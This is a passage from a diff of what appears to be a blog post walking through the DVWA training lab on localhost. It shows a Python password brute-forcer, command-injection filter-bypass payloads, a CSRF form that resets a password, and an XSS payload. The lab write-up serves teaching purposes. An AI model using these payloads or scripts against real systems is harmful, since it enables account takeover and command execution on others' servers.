+    r &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; session&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;get&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;http://127.0.0.1/dvwa/vulnerabilities/brute/index.php&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;cookies&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;COOKIES&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+    body &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; r&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;split&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+    token &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; body&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;body&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;index&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;name=&apos;user_token&apos;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;split&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;=&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
+
+    p &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; passwords&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;readline&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;strip&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+    url &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; get_url&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;username&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;token&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+    r &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; session&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;get&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;cookies&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;COOKIES&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;incorrect&apos;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; r&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Trying &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Found &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h1&gt;Command Injection&lt;/h1&gt;
+&lt;p&gt;Trying to inject a windows command - &lt;code class=&quot;language-text&quot;&gt;dir&lt;/code&gt;&lt;/p&gt;
+&lt;h2&gt;Low&lt;/h2&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$target&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;ip&apos;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;token comment&quot;&gt;// Determine OS and execute the ping command.&lt;/span&gt;
+    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;stristr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;php_uname&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;s&apos;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;Windows NT&apos;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;token comment&quot;&gt;// Windows&lt;/span&gt;
+        &lt;span class=&quot;token variable&quot;&gt;$cmd&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;ping  &apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$target&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;It is directly executing the &lt;code class=&quot;language-text&quot;&gt;$target&lt;/code&gt; without any input validation.
+&lt;strong&gt;Attack :&lt;/strong&gt; 127.0.0.1 &amp;#x26;&amp;#x26; dir&lt;/p&gt;
+&lt;h2&gt;Medium&lt;/h2&gt;
+&lt;p&gt;Some level of input validation is performed this time,&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Set blacklist&lt;/span&gt;
+    &lt;span class=&quot;token variable&quot;&gt;$substitutions&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
+        &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;&amp;amp;&amp;amp;&apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;;&apos;&lt;/span&gt;  &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;token comment&quot;&gt;// Remove any of the charactars in the array (blacklist).&lt;/span&gt;
+    &lt;span class=&quot;token variable&quot;&gt;$target&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;array_keys&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$substitutions&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$substitutions&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$target&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;But, notice that only &lt;code class=&quot;language-text&quot;&gt;&amp;amp;&amp;amp;&lt;/code&gt; is being replaced, we can use &lt;code class=&quot;language-text&quot;&gt;&amp;amp;&lt;/code&gt;.
+&lt;strong&gt;Attack :&lt;/strong&gt; 127.0.0.1 &amp;#x26; dir&lt;/p&gt;
+&lt;h2&gt;High&lt;/h2&gt;
+&lt;p&gt;More Filtering has been done,&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;Submit&apos;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;  &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;token comment&quot;&gt;// Get input&lt;/span&gt;
+    &lt;span class=&quot;token variable&quot;&gt;$target&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;trim&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;ip&apos;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;token comment&quot;&gt;// Set blacklist&lt;/span&gt;
+    &lt;span class=&quot;token variable&quot;&gt;$substitutions&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
+        &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;&amp;amp;&apos;&lt;/span&gt;  &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;;&apos;&lt;/span&gt;  &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;| &apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;-&apos;&lt;/span&gt;  &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;$&apos;&lt;/span&gt;  &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;(&apos;&lt;/span&gt;  &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;)&apos;&lt;/span&gt;  &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;`&apos;&lt;/span&gt;  &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;||&apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;token comment&quot;&gt;// Remove any of the characters in the array (blacklist).&lt;/span&gt;
+    &lt;span class=&quot;token variable&quot;&gt;$target&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;array_keys&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$substitutions&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$substitutions&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$target&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The substitutions only match &lt;code class=&quot;language-text&quot;&gt;| &lt;/code&gt; and not &lt;code class=&quot;language-text&quot;&gt;|&lt;/code&gt;. Hence, there is a loophole in the validation.
+The pipe symbol (|) is used for output redirection, and that is why you want see the output for the ping command.
+&lt;strong&gt;Attack :&lt;/strong&gt; 127.0.0.1|dir (No Spaces)&lt;/p&gt;
+&lt;h1&gt;CSRF&lt;/h1&gt;
+&lt;h2&gt;Low&lt;/h2&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;html&quot;&gt;&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;form&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;http://127.0.0.1/dvwa/vulnerabilities/csrf/?&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;GET&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
+ &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;h1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Click Me&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;h1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
+ &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;hidden&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;AUTOCOMPLETE&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;off&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;password_new&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;hacked&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
+ &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;hidden&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;AUTOCOMPLETE&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;off&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;password_conf&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;hacked&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
+ &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;submit&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;Change&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;Change&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;form&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The above website is a phishing website created by the attacker, it sends a request to the link,
+”&lt;a href=&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/&quot;&gt;http://127.0.0.1/dvwa/vulnerabilities/csrf/&lt;/a&gt;?” with the new password in the parameters of the link. It is hence used to attack the CSRF vulnerability, since, the website doesn’t check for the source of the request.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1&gt;XSS DOM&lt;/h1&gt;
+&lt;h2&gt;Low&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Attack :&lt;/strong&gt;  &lt;code class=&quot;language-text&quot;&gt;&amp;lt;script&gt;alert(&quot;hacked&quot;)&amp;lt;/script&gt;&lt;/code&gt;&lt;/p&gt;
+&lt;h2&gt;Medium&lt;/h2&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;html&quot;&gt;&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;select&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;default&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
+				&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token script&quot;&gt;&lt;span class=&quot;token language-javascript&quot;&gt;
+					&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;location&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;href&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;default=&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+						&lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; lang &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;location&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;href&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;location&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;href&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;default=&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
